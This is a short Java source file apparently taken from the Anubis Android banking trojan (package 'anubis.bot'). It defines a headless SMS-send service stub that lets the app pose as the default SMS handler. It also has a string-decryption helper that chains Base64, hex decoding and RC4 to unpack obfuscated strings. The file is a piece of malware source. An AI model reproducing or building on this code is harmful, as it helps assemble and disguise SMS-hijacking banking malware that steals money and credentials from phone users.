package anubis.bot.myapplication;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;

public class ServiceHeadlessSmsSend extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

}
